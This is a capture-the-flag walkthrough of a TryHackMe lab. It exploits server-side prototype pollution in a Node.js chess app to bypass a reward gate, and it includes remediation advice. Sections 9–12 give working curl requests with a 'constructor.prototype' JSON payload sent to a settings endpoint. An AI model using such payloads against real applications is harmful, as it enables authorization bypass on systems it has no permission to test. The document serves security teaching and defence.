---
title: "Fool's Mate, Revenge — TryHackMe | Security Assessment Walkthrough"
description: "Portfolio-grade walkthrough of server-side prototype pollution and reward-gate bypass in a Node.js chess application."
---

# Fool's Mate, Revenge — Security Assessment Walkthrough

> **Room:** [TryHackMe — Fool's Mate, Revenge](https://tryhackme.com/room/foolsm8v2)  
> **Classification:** Web Application Security  
> **Difficulty:** Advanced  
> **Primary Vulnerability:** Prototype Pollution  
> **Stack Observed:** Node.js / HTTP JSON APIs / client-side JavaScript

## 1. Executive Summary

**Fool's Mate, Revenge** is a useful demonstration of the difference between *moving a security check to the backend* and *actually making the backend trustworthy*.

The application presents an apparently trivial chess endgame: White has a forced mate in one by moving the rook from `a1` to `a8`. In the hardened sequel, sending the winning move directly to the API is no longer sufficient. The backend calculates the move correctly, but a reward gate blocks the flag because a server-side authorization/configuration state is not enabled.

The critical clue is the rejection response:

```json
{
  "locked": true,
  "reason": "reward gate closed: session.config.unlocked is not set"
}
```

That error identifies the exact object path used by the authorization logic.

A new Preferences feature then exposes an `/api/settings` endpoint that accepts JSON and passes it into server-side merge logic. Review of the application JavaScript shows that user-controlled preference objects are sent directly to this endpoint.

The weakness emerges when the backend recursively merges object properties without safely rejecting special JavaScript keys. By using `constructor.prototype`, an attacker can inject a property onto `Object.prototype`. Because JavaScript objects inherit from that prototype, the reward gate's `session.config` lookup can resolve to attacker-controlled inherited state.

An initial nested payload caused a recursive merge failure. The successful approach therefore keeps the injected value **flat**, avoiding recursive cloning while still altering the inherited property used by the authorization check.

The final attack chain is:

```text
Hardened server-side gate
        ↓
Rejected checkmate request reveals state path
        ↓
Preferences endpoint discovered
        ↓
Client JavaScript exposes JSON merge surface
        ↓
Prototype Pollution via constructor.prototype
        ↓
Inherited `config` becomes truthy
        ↓
Checkmate request
        ↓
Reward gate opens
```

![Attack chain evidence](../docs/assets/04-prototype-pollution-exploitation.png)

---

## 2. Scope and Safety

All testing described here is limited to the intentionally vulnerable TryHackMe machine supplied by the room.

No third-party systems should be targeted using these techniques without explicit authorization.

---

## 3. Initial Reconnaissance

The challenge page identifies the target as **Fool's Mate, Revenge**, a sequel designed around server-side hardening.

![Room overview](../docs/assets/01-room-overview.png)

The opening message establishes the theme: the client-side defenses from the previous challenge have been replaced by explicit server-side logic.

This immediately suggests an assessment strategy:

> Treat the browser as untrusted and identify the server endpoints that enforce state transitions and authorization.

---

## 4. Understanding the Endgame

The main interface exposes an interactive chess position with **White to move**.

![Endgame position](../docs/assets/02-endgame-position.png)

The visible position has an obvious back-rank mating move:

```text
Ra8#
```

The corresponding HTTP request uses:

```json
{
  "from": "a1",
  "to": "a8"
}
```

The key distinction is that a valid move does not automatically mean a valid reward state.

---

## 5. Testing the Move API

The move endpoint can be called directly. This bypasses any assumptions about browser-side controls and allows the actual server response to be observed.

A request of the following form was used:

```bash
curl -X POST http://TARGET:3000/api/move   -H "Content-Type: application/json"   -d '{"from":"a1","to":"a8"}'
```

The server returns a successful chess calculation but a locked reward:

```json
{
  "ok": true,
  "move": "a1a8",
  "status": "checkmate",
  "winner": "white",
  "locked": true,
  "message": "Checkmate! No reward for you.",
  "reason": "reward gate closed: session.config.unlocked is not set"
}
```

This response is the first major breakthrough.

### Key observation

The server is explicitly checking:

```text
session.config.unlocked
```

Therefore, the assessment should focus on how `session` and nested configuration data are constructed or inherited.

---

## 6. Mapping the New Attack Surface

The hardened interface introduces a Preferences block containing:

- board theme;
- piece set;
- move animation timing.

![Preferences surface](../docs/assets/03-preferences-surface.png)

A feature that stores attacker-controlled application preferences is worth examining because these values must cross the browser/server trust boundary.

---

## 7. Inspecting the Client JavaScript

The application script reveals the settings request:

```javascript
async function savePrefs() {
  const prefs = {
    theme: themeSelect.value,
    pieceSet: pieceSetSelect.value,
    animationMs: Number(animSelect.value)
  };

  const res = await fetch('/api/settings', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(prefs)
  });

  const data = await res.json();
  if (data && data.preferences) applyPrefs(data.preferences);
}
```

This confirms an important design characteristic:

```text
Browser object
      ↓
JSON serialization
      ↓
POST /api/settings
      ↓
Server-side object processing
```

The natural next step is to determine whether the server safely handles **unexpected object keys**, not merely the three legitimate preference fields.

---

## 8. Vulnerability Identification — Prototype Pollution

In Node.js, object prototypes are shared through JavaScript's inheritance model. Unsafe recursive merging can therefore become dangerous when attacker-controlled keys such as:

```text
__proto__
constructor
prototype
```

are accepted as ordinary object properties.

A vulnerable deep merge can accidentally change properties on `Object.prototype`.

The security consequence is broader than modifying one preference record:

```text
Object.prototype
      ↓
Inherited by normal objects
      ↓
Session/configuration lookups may inherit attacker-set values
      ↓
Authorization logic can make an unintended decision
```

This is the core vulnerability in the room.

---

## 9. The Failed Exploitation Attempt

The disclosed object path suggested a first payload resembling:

```json
{
  "constructor": {
    "prototype": {
      "config": {
        "unlocked": true
      }
    }
  }
}
```

The application responded with a recursive failure such as:

```text
RangeError: Maximum call stack size exceeded
    at deepMerge (...)
```

This error is valuable evidence.

It indicates that the server is recursively traversing attacker-controlled object structures and that the nested prototype manipulation path can cause self-referential processing.

The lesson is:

> A prototype-pollution primitive may exist, while the *shape* of the first payload still determines whether the application survives long enough to reach the vulnerable state.

---

## 10. Payload Engineering

The critical requirement is to make the property used by the reward gate resolve as truthy without creating an unnecessarily nested recursive structure.

The working strategy is therefore to inject a **flat `config` value** into the prototype rather than recursively placing an entire `config.unlocked` tree under the prototype.

Conceptually:

```text
constructor
  └── prototype
       └── config = true
```

The request can be represented as:

```bash
curl -X POST http://TARGET:3000/api/settings   -H "Content-Type: application/json"   -d '{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"config":true}}}'
```

![Prototype pollution exploitation](../docs/assets/04-prototype-pollution-exploitation.png)

The server returns a normal settings response instead of crashing.

That matters because the attacker is no longer trying to directly set a nested session object. The goal is to influence what the backend sees when it performs an ordinary property lookup.

---

## 11. Why the Flat Injection Works

JavaScript property lookup follows the object's own properties and then its prototype chain.

Conceptually:

```text
session.config
     │
     ├── own property?
     │       └── no
     │
     └── inherited property?
             └── Object.prototype.config
                     └── true
```

As a result, a check such as:

```javascript
session.config
```

may now evaluate as truthy even though the session object itself never received an explicit `config` property.

The room's reward check then continues to a nested lookup under that truthy value.

This is the architectural weakness:

> **Authorization logic trusted an inherited property that could be influenced through prototype pollution.**

---

## 12. Replaying the Winning Chess Move

After the settings request completes, the original move is submitted again:

```bash
curl -X POST http://TARGET:3000/api/move   -H "Content-Type: application/json"   -d '{"from":"a1","to":"a8"}'
```

The chess engine still recognizes the same move:

```text
a1 → a8
```

but this time the reward gate no longer blocks the response.

![Checkmate and reward](../docs/assets/05-checkmate-reward.png)

The key indicator is that the previous `locked: true` state is replaced by the successful reward response.

---

## 13. Result

The challenge flag has been intentionally **redacted from the public portfolio documentation**.

```text
THM{REDACTED_FOR_PUBLICATION}
```

The screenshot used for the result section is retained because it demonstrates the successful end state, but the published repository documentation never exposes the real flag string.

---

## 14. Technical Attack Chain

```text
[1] Enumerate application
        │
        ▼
[2] Identify /api/move
        │
        ▼
[3] Observe reward gate rejection
        │
        ▼
session.config.unlocked
        │
        ▼
[4] Identify /api/settings
        │
        ▼
[5] Review app.js
        │
        ▼
user-controlled JSON → server merge
        │
        ▼
[6] Prototype Pollution
constructor → prototype → config
        │
        ▼
[7] Inherited state becomes truthy
        │
        ▼
[8] Re-submit a1 → a8
        │
        ▼
[9] Reward gate bypassed
```

---

## 15. Root Cause Analysis

### 15.1 Unsafe deep merge

The backend accepts arbitrary object structure and recursively merges attacker-supplied properties.

### 15.2 Special keys are trusted

Keys associated with JavaScript's prototype machinery are not sufficiently filtered.

### 15.3 Authorization depends on object inheritance

The reward decision relies on a property path that can be affected by inherited values.

### 15.4 Feature boundary became a security boundary

A seemingly harmless preferences feature created a server-side object-processing primitive that could influence security-sensitive state.

---

## 16. Security Impact

Prototype pollution can have consequences far beyond cosmetic settings.

Depending on the affected application's architecture, it can lead to:

- authorization bypass;
- role or feature flag manipulation;
- configuration tampering;
- logic-condition bypass;
- denial of service;
- in some designs, server-side code execution.

In this room, the concrete impact is **reward-gate bypass through inherited state manipulation**.

---

## 17. Remediation

### A. Use allowlists

Only accept the expected settings:

```text
theme
pieceSet
animationMs
```

Reject every other key.

### B. Block prototype-manipulation keys

Explicitly reject:

```text
__proto__
prototype
constructor
```

at every depth where arbitrary objects are parsed.

### C. Avoid unsafe recursive merge utilities

Prefer schema validation followed by explicit field assignment.

### D. Use null-prototype maps for untrusted dictionaries

When appropriate:

```javascript
Object.create(null)
```

reduces exposure to inherited properties.

### E. Authorize using explicit own-state

Security-sensitive decisions should not rely on inherited properties.

Prefer checks that distinguish own properties and validate their types and structure.

### F. Validate JSON schemas

An endpoint intended to receive three scalar preference values should enforce a strict schema rather than accepting arbitrary nested objects.

### G. Do not leak stack traces

The call-stack error materially improved exploitability by exposing internal function names and source locations.

---

## 18. Assessment Lessons

This room reinforces several professional testing principles.

### The server is the source of truth

Bypassing browser logic was not enough in this sequel, so the assessment moved directly to the server API.

### Error messages are evidence

The reward rejection disclosed the exact authorization state path. The stack overflow disclosed the recursive merge primitive.

### Object handling deserves security review

Even endpoints that look non-sensitive can become dangerous when they process arbitrary nested JSON.

### Prototype pollution is a logic vulnerability

The interesting outcome here is not simply "global object modification." The practical impact came from the way inherited values intersected with authorization logic.

### Exploit reliability matters

The first prototype payload crashed the application. A professional assessment does not stop at identifying a primitive; it engineers a stable request that demonstrates impact without unnecessary instability.

---

## 19. Evidence Matrix

| Stage | Evidence | Security Meaning |
|---|---|---|
| Recon | TryHackMe room + target UI | Defines the application |
| Endgame | `Ra8#` position | Establishes intended winning action |
| API test | `locked: true` | Server-side reward gate confirmed |
| Rejection reason | `session.config.unlocked` | Exact state path disclosed |
| Preferences | `/api/settings` | Attacker-controlled JSON surface |
| JavaScript review | `JSON.stringify(prefs)` | Browser-to-server object flow confirmed |
| Stack trace | `deepMerge(...)` | Recursive merge implementation exposed |
| Prototype payload | `constructor.prototype` | Prototype pollution demonstrated |
| Final move | `a1 → a8` | Authorization bypass validated |
| Reward | Success response | Impact confirmed |

---

## 20. Conclusion

**Fool's Mate, Revenge** is a strong example of why server-side validation alone does not automatically produce a secure application.

The developers improved the original design by enforcing the reward check on the backend. However, the new implementation still trusted unsafe object processing. A prototype-pollution primitive in the preferences path could influence inherited state used by the authorization condition.

The key assessment lesson is:

> **Do not only ask where the authorization check lives. Ask what data structures the authorization check trusts.**

The complete workflow was:

**enumerate → observe → identify state → inspect object flow → exploit prototype inheritance → validate impact**

That is the reusable security methodology this challenge demonstrates.
